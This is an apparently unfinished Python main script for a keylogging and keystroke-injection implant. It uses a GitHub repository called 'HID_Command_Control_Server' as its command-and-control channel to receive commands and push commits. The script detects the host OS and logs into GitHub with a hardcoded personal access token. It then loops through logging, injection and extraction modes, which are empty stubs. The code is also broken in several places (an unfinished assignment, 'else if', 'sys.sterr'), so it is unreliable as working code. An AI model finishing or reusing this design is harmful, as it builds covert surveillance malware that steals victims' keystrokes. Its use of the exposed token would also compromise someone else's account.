from github_git import GitHubRepo
from keyboard_handler import Keyboard_Handler

import platform
import sys
import os

def detect_os( ) -> str:
    """
    Detect OS this script is being run on, 
    return either W for Windows, M for MacOS, L for Linux
    """
    system = platform.system()
    if system == "Windows": # Windows
        return "W"
    elif system == "Darwin": # MacOS
        return "M"
    elif system == "Linux": # Linux
        return "L"
    # Ideally should never reach here and should be able to detect OS
    return "COULD_NOT_FIND_OS"

def setup_communication_with_github_repo() -> GitHubRepo:
    # https://github.com/Alishah634/HID_Command_Control_Server
    repo = GitHubRepo(
        owner = "Alishah634",
        repo = "HID_Command_Control_Server",
        # Use a classic token not a fine grained one!
        token = "ghp_ynZ4QBBOANOuW4nMdd5kzGUcofwXk0tKAMq", # Hardcode belongs to Ali (BAD PRACTICE!!!)
    )

    # Read commits:
    commits = repo.get_recent_commits()
    for c in commits:
        print(c["sha"], c["commit"]["message"])

    # Update a file
    result = repo.update_file(
        path="README.md",
        new_content="Updated from Python without git (development test 1)!",
        message="Automated commit"
    )

    print("Committed:", result["commit"]["sha"])
    return repo

# def recieve_mode_from_git_repo()
#     pass


if __name__ == "__main__":
    # What is this supposed to do? 
    # It needs to start the program ? Figure out which mode to be in?
    # the mode needs to be figured out by the listener so key.py (logging/reading) keystrokes
    # figures out the mode
    #
    #
    # Something to control these:
    #
    # Attack mode: OS Dependent?
    # Sending mode:
    # Logging mode: Key.py (log keystrokes) [need to add OS Specific commands]

    # Detect the OS we are running on:
    # print("OS Name:", os.name)
    # print("Sys Platform:", sys.platform)
    # print("Platform System:", platform.system())
    operating_system_detected = detect_os()
    if operating_system_detected == "COULD_NOT_FIND_OS":
        print("FAILED to detect operating system detected", file=sys.sterr)

    # Set up connection with GitHub repo to recieve and extract commands:
    repo = setup_communication_with_github_repo()

    # Set up instance of the keyhandler which handles logging, injection and extraction:
    keyboard_handler =  


    # What mode are we in ? Log -> L, Inject -> I , Extract -> E (Default mode is Log):
    mode = "L"
    can_communicate_to_github = False

    # Set the check for connection to GitHub:
    while True:
        can_communicate_to_github = True if repo.can_reach_github() else False

        if mode == "L":
            # Call key loggin function:
            pass
        else if mode == "I":
            # Call key Injection function:
            pass
        else if mode == "E":
            # Call key Extraction function:
            pass
        else:
            # Call key loggin function:
            mode = "L"
            pass




        pass


    pass

